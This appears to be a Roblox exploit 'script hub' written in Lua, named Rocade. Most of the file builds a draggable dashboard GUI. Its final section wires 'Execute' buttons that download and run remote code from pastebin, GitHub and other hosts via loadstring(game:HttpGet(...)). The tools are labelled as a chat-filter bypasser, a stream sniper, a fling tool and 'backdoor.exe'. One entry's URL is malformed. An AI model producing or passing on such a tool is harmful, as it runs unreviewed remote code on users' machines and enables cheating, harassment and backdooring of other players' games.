--maxio#2558
local Rocade = Instance.new("ScreenGui")
local MainUI = Instance.new("Frame")
local Side = Instance.new("Frame")
local Line = Instance.new("Frame")
local Info = Instance.new("Folder")
local ProfilePic = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local Date = Instance.new("TextLabel")
local Tabs = Instance.new("Folder")
local Dashboard = Instance.new("TextButton")
local dashboardLogo = Instance.new("ImageButton")
local Scripts = Instance.new("TextButton")
local accessibility = Instance.new("ImageButton")
local ChoosenFrameLine = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local DashboardFrame = Instance.new("Frame")
local Updates = Instance.new("Frame")
local Update1 = Instance.new("TextLabel")
local Update2 = Instance.new("TextLabel")
local UpdatesTextLabel = Instance.new("TextLabel")
local GameInfo = Instance.new("Frame")
local Text1 = Instance.new("TextLabel")
local Text2 = Instance.new("TextLabel")
local UpdatesTextLabel_2 = Instance.new("TextLabel")
local ScriptsFrame = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local ScriptPanel = Instance.new("Frame")
local SCName = Instance.new("TextLabel")
local Execute = Instance.new("TextButton")
local ImageLabel = Instance.new("ImageLabel")
local UICorner_3 = Instance.new("UICorner")

--Properties:

Rocade.Name = "Rocade"
Rocade.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Rocade.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MainUI.Name = "MainUI"
MainUI.Parent = Rocade
MainUI.BackgroundColor3 = Color3.fromRGB(27, 28, 48)
MainUI.BorderSizePixel = 0
MainUI.Position = UDim2.new(0.271006823, 0, 0.139240503, 0)
MainUI.Size = UDim2.new(0, 655, 0, 454)

Side.Name = "Side"
Side.Parent = MainUI
Side.BackgroundColor3 = Color3.fromRGB(34, 35, 57)
Side.BorderSizePixel = 0
Side.Size = UDim2.new(0, 166, 0, 454)

Line.Name = "Line"
Line.Parent = Side
Line.BackgroundColor3 = Color3.fromRGB(17, 18, 31)
Line.BorderSizePixel = 0
Line.Position = UDim2.new(0.997452915, 0, 0, 0)
Line.Size = UDim2.new(0, 2, 0, 454)

Info.Name = "Info"
Info.Parent = Side

ProfilePic.Name = "ProfilePic"
ProfilePic.Parent = Info
ProfilePic.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ProfilePic.BackgroundTransparency = 1.000
ProfilePic.Position = UDim2.new(0.0547078848, 0, 0.0247092918, 0)
ProfilePic.Size = UDim2.new(0, 56, 0, 56)
ProfilePic.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

UICorner.CornerRadius = UDim.new(2, 4)
UICorner.Parent = ProfilePic

TextLabel.Parent = Info
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.391566277, 0, 0.0242290758, 0)
TextLabel.Size = UDim2.new(0, 93, 0, 47)
TextLabel.Font = Enum.Font.GothamSemibold
TextLabel.Text = "User"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 14.000

Date.Name = "Date"
Date.Parent = Info
Date.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Date.BackgroundTransparency = 1.000
Date.Position = UDim2.new(0.386033207, 0, 0.0704845861, 0)
Date.Size = UDim2.new(0, 92, 0, 47)
Date.Font = Enum.Font.GothamSemibold
Date.Text = "JoinDate"
Date.TextColor3 = Color3.fromRGB(115, 115, 115)
Date.TextSize = 14.000

Tabs.Name = "Tabs"
Tabs.Parent = Side

Dashboard.Name = "Dashboard"
Dashboard.Parent = Tabs
Dashboard.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Dashboard.BackgroundTransparency = 1.000
Dashboard.Position = UDim2.new(0.0783132538, 0, 0.182819381, 0)
Dashboard.Size = UDim2.new(0, 146, 0, 44)
Dashboard.Font = Enum.Font.GothamSemibold
Dashboard.Text = "   Dashboard"
Dashboard.TextColor3 = Color3.fromRGB(255, 255, 255)
Dashboard.TextSize = 14.000

dashboardLogo.Name = "dashboardLogo"
dashboardLogo.Parent = Dashboard
dashboardLogo.BackgroundTransparency = 1.000
dashboardLogo.Position = UDim2.new(0.111842118, 0, 0.295454562, 0)
dashboardLogo.Size = UDim2.new(0, 18, 0, 18)
dashboardLogo.ZIndex = 2
dashboardLogo.Image = "rbxassetid://3926305904"
dashboardLogo.ImageRectOffset = Vector2.new(44, 644)
dashboardLogo.ImageRectSize = Vector2.new(36, 36)

Scripts.Name = "Scripts"
Scripts.Parent = Tabs
Scripts.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Scripts.BackgroundTransparency = 1.000
Scripts.Position = UDim2.new(0.0783132538, 0, 0.262114525, 0)
Scripts.Size = UDim2.new(0, 146, 0, 44)
Scripts.Font = Enum.Font.GothamSemibold
Scripts.Text = "Scripts"
Scripts.TextColor3 = Color3.fromRGB(255, 255, 255)
Scripts.TextSize = 14.000

accessibility.Name = "accessibility"
accessibility.Parent = Scripts
accessibility.BackgroundTransparency = 1.000
accessibility.LayoutOrder = 13
accessibility.Position = UDim2.new(0.118421055, 0, 0.25, 0)
accessibility.Size = UDim2.new(0, 21, 0, 21)
accessibility.ZIndex = 2
accessibility.Image = "rbxassetid://3926307971"
accessibility.ImageRectOffset = Vector2.new(164, 124)
accessibility.ImageRectSize = Vector2.new(36, 36)

ChoosenFrameLine.Name = "ChoosenFrameLine"
ChoosenFrameLine.Parent = Side
ChoosenFrameLine.BackgroundColor3 = Color3.fromRGB(49, 45, 104)
ChoosenFrameLine.BorderSizePixel = 0
ChoosenFrameLine.Position = UDim2.new(0, 0, 0.200000003, 0)
ChoosenFrameLine.Size = UDim2.new(0, 6, 0, 28)

UICorner_2.CornerRadius = UDim.new(0, 4)
UICorner_2.Parent = ChoosenFrameLine

DashboardFrame.Name = "DashboardFrame"
DashboardFrame.Parent = MainUI
DashboardFrame.BackgroundColor3 = Color3.fromRGB(27, 28, 48)
DashboardFrame.BorderSizePixel = 0
DashboardFrame.Position = UDim2.new(0.265648842, 0, 0, 0)
DashboardFrame.Size = UDim2.new(0, 481, 0, 454)
DashboardFrame.Visible = false

Updates.Name = "Updates"
Updates.Parent = DashboardFrame
Updates.BackgroundColor3 = Color3.fromRGB(34, 35, 57)
Updates.BorderSizePixel = 0
Updates.Position = UDim2.new(0.120582119, 0, 0.127753302, 0)
Updates.Size = UDim2.new(0, 361, 0, 162)

Update1.Name = "Update1"
Update1.Parent = Updates
Update1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Update1.BackgroundTransparency = 1.000
Update1.Position = UDim2.new(0.0303030312, 0, 0, 0)
Update1.Size = UDim2.new(0, 200, 0, 50)
Update1.Font = Enum.Font.GothamSemibold
Update1.Text = "[+] Updated To V 1.0.1"
Update1.TextColor3 = Color3.fromRGB(255, 255, 255)
Update1.TextSize = 14.000
Update1.TextXAlignment = Enum.TextXAlignment.Left

Update2.Name = "Update2"
Update2.Parent = Updates
Update2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Update2.BackgroundTransparency = 1.000
Update2.Position = UDim2.new(0.0303030312, 0, 0.180790961, 0)
Update2.Size = UDim2.new(0, 200, 0, 50)
Update2.Font = Enum.Font.GothamSemibold
Update2.Text = "[+] Released"
Update2.TextColor3 = Color3.fromRGB(255, 255, 255)
Update2.TextSize = 14.000
Update2.TextXAlignment = Enum.TextXAlignment.Left

UpdatesTextLabel.Name = "UpdatesTextLabel"
UpdatesTextLabel.Parent = DashboardFrame
UpdatesTextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
UpdatesTextLabel.BackgroundTransparency = 1.000
UpdatesTextLabel.Position = UDim2.new(0.291060299, 0, 0.0330396481, 0)
UpdatesTextLabel.Size = UDim2.new(0, 200, 0, 50)
UpdatesTextLabel.Font = Enum.Font.GothamSemibold
UpdatesTextLabel.Text = "Updates"
UpdatesTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
UpdatesTextLabel.TextSize = 14.000

GameInfo.Name = "GameInfo"
GameInfo.Parent = DashboardFrame
GameInfo.BackgroundColor3 = Color3.fromRGB(34, 35, 57)
GameInfo.BorderSizePixel = 0
GameInfo.Position = UDim2.new(0.124740124, 0, 0.563876629, 0)
GameInfo.Size = UDim2.new(0, 361, 0, 162)

Text1.Name = "Text1"
Text1.Parent = GameInfo
Text1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text1.BackgroundTransparency = 1.000
Text1.Position = UDim2.new(0.0303030312, 0, 0, 0)
Text1.Size = UDim2.new(0, 200, 0, 50)
Text1.Font = Enum.Font.GothamSemibold
Text1.Text = "[+] GameName"
Text1.TextColor3 = Color3.fromRGB(255, 255, 255)
Text1.TextSize = 14.000
Text1.TextXAlignment = Enum.TextXAlignment.Left

Text2.Name = "Text2"
Text2.Parent = GameInfo
Text2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Text2.BackgroundTransparency = 1.000
Text2.Position = UDim2.new(0.0303030312, 0, 0.180790961, 0)
Text2.Size = UDim2.new(0, 200, 0, 50)
Text2.Font = Enum.Font.GothamSemibold
Text2.Text = "[+] Players"
Text2.TextColor3 = Color3.fromRGB(255, 255, 255)
Text2.TextSize = 14.000
Text2.TextXAlignment = Enum.TextXAlignment.Left

UpdatesTextLabel_2.Name = "UpdatesTextLabel"
UpdatesTextLabel_2.Parent = DashboardFrame
UpdatesTextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
UpdatesTextLabel_2.BackgroundTransparency = 1.000
UpdatesTextLabel_2.Position = UDim2.new(0.270270288, 0, 0.47136566, 0)
UpdatesTextLabel_2.Size = UDim2.new(0, 200, 0, 50)
UpdatesTextLabel_2.Font = Enum.Font.GothamSemibold
UpdatesTextLabel_2.Text = "Game Information"
UpdatesTextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
UpdatesTextLabel_2.TextSize = 14.000

ScriptsFrame.Name = "ScriptsFrame"
ScriptsFrame.Parent = MainUI
ScriptsFrame.Active = true
ScriptsFrame.BackgroundColor3 = Color3.fromRGB(27, 28, 48)
ScriptsFrame.BorderSizePixel = 0
ScriptsFrame.Position = UDim2.new(0.267175585, 0, 0, 0)
ScriptsFrame.Size = UDim2.new(0, 480, 0, 454)
ScriptsFrame.ScrollBarThickness = 4

UIListLayout.Parent = ScriptsFrame
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 9)

ScriptPanel.Name = "ScriptPanel"
ScriptPanel.Parent = ScriptsFrame
ScriptPanel.BackgroundColor3 = Color3.fromRGB(34, 35, 57)
ScriptPanel.BorderSizePixel = 0
ScriptPanel.Position = UDim2.new(0.108333334, 0, -0.00770925125, 0)
ScriptPanel.Size = UDim2.new(0, 376, 0, 172)

SCName.Name = "SCName"
SCName.Parent = ScriptPanel
SCName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SCName.BackgroundTransparency = 1.000
SCName.Position = UDim2.new(-0.0345744416, 0, 0, 0)
SCName.Size = UDim2.new(0, 177, 0, 42)
SCName.Font = Enum.Font.GothamSemibold
SCName.Text = "(Test Button)"
SCName.TextColor3 = Color3.fromRGB(255, 255, 255)
SCName.TextSize = 14.000

Execute.Name = "Execute"
Execute.Parent = ScriptPanel
Execute.BackgroundColor3 = Color3.fromRGB(27, 28, 48)
Execute.BorderSizePixel = 0
Execute.Position = UDim2.new(0.154255316, 0, 0.751433849, 0)
Execute.Size = UDim2.new(0, 260, 0, 34)
Execute.Font = Enum.Font.GothamSemibold
Execute.Text = "Execute"
Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
Execute.TextSize = 14.000

ImageLabel.Parent = ScriptPanel
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.385638297, 0, 0.128955394, 0)
ImageLabel.Size = UDim2.new(0, 92, 0, 87)
ImageLabel.Image = "http://www.roblox.com/asset/?id=8374448707"

UICorner_3.CornerRadius = UDim.new(0, 4)
UICorner_3.Parent = ScriptPanel

-- Scripts:

local function AWLD_fake_script() -- ProfilePic.ImageChanger 
	local script = Instance.new('LocalScript', ProfilePic)

	local Players = game:GetService("Players")
	
	local player = Players.LocalPlayer
	
	
	local userId = player.UserId
	local thumbType = Enum.ThumbnailType.HeadShot
	local thumbSize = Enum.ThumbnailSize.Size420x420
	local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
	
	
	local imageLabel = script.Parent
	imageLabel.Image = content
end
coroutine.wrap(AWLD_fake_script)()
local function TWXLS_fake_script() -- TextLabel.ChangeText 
	local script = Instance.new('LocalScript', TextLabel)

	script.Parent.Text = game:GetService("Players").LocalPlayer.Name
end
coroutine.wrap(TWXLS_fake_script)()
local function OYLUJLD_fake_script() -- Date.ChangeText 
	local script = Instance.new('LocalScript', Date)

	local plr = game.Players.LocalPlayer
	local day = 60 * 60 * 24
	
	local tm = os.time()
	local date = os.date("!*t", tm)
	
	script.Parent.Text = date.day .. "-" .. date.month .. "-" .. date.year
	
end
coroutine.wrap(OYLUJLD_fake_script)()
local function DWVBT_fake_script() -- Dashboard.OnTouch 
	local script = Instance.new('LocalScript', Dashboard)

	local choosen = script.Parent.Parent.Parent.ChoosenFrameLine
	local frames = script.Parent.Parent.Parent.Parent
	
	
	script.Parent.MouseButton1Click:Connect(function()
		choosen:TweenPosition(UDim2.new(0, 0,0.2, 0))
		frames.DashboardFrame.Visible = false
		frames.ScriptsFrame.Visible = false
		frames.DashboardFrame.Visible = true
	end)
end
coroutine.wrap(DWVBT_fake_script)()
local function WMDP_fake_script() -- Scripts.OnTouch 
	local script = Instance.new('LocalScript', Scripts)

	local choosen = script.Parent.Parent.Parent.ChoosenFrameLine
	local frames = script.Parent.Parent.Parent.Parent
	
	
	
	script.Parent.MouseButton1Click:Connect(function()
		choosen:TweenPosition(UDim2.new(0, 0,0.275, 0))
		frames.ScriptsFrame.Visible = false
		frames.DashboardFrame.Visible = false
		frames.ScriptsFrame.Visible = true
	end)
	
	
	
	
	
	
end
coroutine.wrap(WMDP_fake_script)()
local function SYUZNL_fake_script() -- MainUI.Dragify 
	local script = Instance.new('LocalScript', MainUI)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0.50
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(SYUZNL_fake_script)()
local function OZZHSH_fake_script() -- Text1.LocalScript 
	local script = Instance.new('LocalScript', Text1)

	local name = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
	script.Parent.Text = "[+] Name : "..name..""
	
end
coroutine.wrap(OZZHSH_fake_script)()
local function SWZK_fake_script() -- Text2.Change 
	local script = Instance.new('LocalScript', Text2)

	script.Parent.Text = "[+] Players : "..#game.Players:GetPlayers()..""
	
	
	
	
	
end
coroutine.wrap(SWZK_fake_script)()
local function QLWMZ_fake_script() -- ScriptsFrame.Handler 
	local script = Instance.new('LocalScript', ScriptsFrame)

	local Container = script.Parent
	local UIListLayout = script.Parent.UIListLayout
	
	local function updatescroll()
		Container.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 20)
	end
	
	
	function addscript(name,callback)
		local tab = script.Parent.ScriptPanel:Clone()
		local button = tab.Execute
		tab.Parent = script.Parent
		tab.SCName.Text = name
		callback = callback or function() end
		button.MouseButton1Click:connect(function()
			
			spawn(function()
				pcall(callback)
				end)
		end)
		
		
	end
	
	
	addscript("Chat Bypasser", function()
		loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
		updatescroll()
	end)
	
	
	addscript("Stream Sniper", function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Blissful4992/Miscellaneous/main/StreamSniper.lua"))()
		updatescroll()
	end)
	
	addscript("Fling GUI", function()
		loadstring(game:HttpGet("loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()"))()
		updatescroll()
	end)
	
	addscript("Shlex Hub", function()
		loadstring(game:HttpGet("https://shlex.dev/release/domainx/latest.lua"))()
		updatescroll()
	end)
	addscript("Cords Finder", function()
		loadstring(game:HttpGet("https://pastebin.com/raw/VmiMdeVr"))()
		updatescroll()
	end)
	addscript("backdoor.exe", function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
		updatescroll()
	end)
	addscript("Chat Hax FE", function()
		loadstring(game:HttpGet('https://www.toptal.com/developers/hastebin/raw/fosazipiri.md'))()
		updatescroll()
	end)
	
	
	
	
	
	
	
end
coroutine.wrap(QLWMZ_fake_script)()
